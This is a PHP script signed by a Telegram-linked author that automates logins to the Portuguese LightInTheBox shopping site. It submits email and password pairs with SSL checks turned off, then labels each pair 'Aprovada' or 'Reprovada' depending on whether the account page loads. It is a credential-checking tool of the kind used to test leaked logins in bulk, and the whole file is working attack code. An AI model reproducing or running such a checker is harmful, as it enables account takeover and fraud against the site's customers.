<?php


/*-------------------*/
#  Coded By Hyperguy  # 
#   t.me/SpiritCoder  #
#     2019/01/14      #
/*-------------------*/



function catcha($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function DelCookie()
{
	if (file_exists('Cookie.txt')) 
		{
			unlink('Cookie.txt');
	}
}

DelCookie();

Class CUrlConnect
{
	public $email;
	public $senha;
	public $headers;
	public $url;

	

	public function CurlCallback()
	{

	$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $this->url);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

							curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

								curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/Cookie.txt');

									curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/Cookie.txt');

									   curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);

										  curl_setopt($ch, CURLOPT_POST, true);

											 curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=accountLogin&targetUrl=&login_email_address='.$this->email.'&login_password='.$this->senha.'&area_code=55&login_mobile_number=&login_mobile_password=');

												$log = curl_exec($ch);

													echo "$log";

														if(strpos($log, 'Meus Pedidos'))
														{
															echo "Aprovada $this->email|$this->senha By Hyperguy";
														}
														else
														{
															echo "Reprovada $this->email|$this->senha By Hyperguy";
														}



													 		curl_close($ch); }
	
	}

$Exec = new CUrlConnect();

$Exec->email = 'Hyperguy@provedor.com'; // $_POST['']; , $_GET['']; etc ..

$Exec->senha = 'Hyperguy'; // $_POST['']; , $_GET['']; etc ..

$Exec->url = 'https://www.lightinthebox.com/pt/index.php?main_page=login&type=login&prm=1.46.206.0';

$Exec->headers = array('Referer: https://www.lightinthebox.com/pt/index.php?main_page=login&src=mainLoginLink&prm=1.1.74.0',
'Content-Type: application/x-www-form-urlencoded',
'Accept-Language: pt-BR',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Host: www.lightinthebox.com',
'Connection: Keep-Alive');

$Exec->CurlCallback();
















?>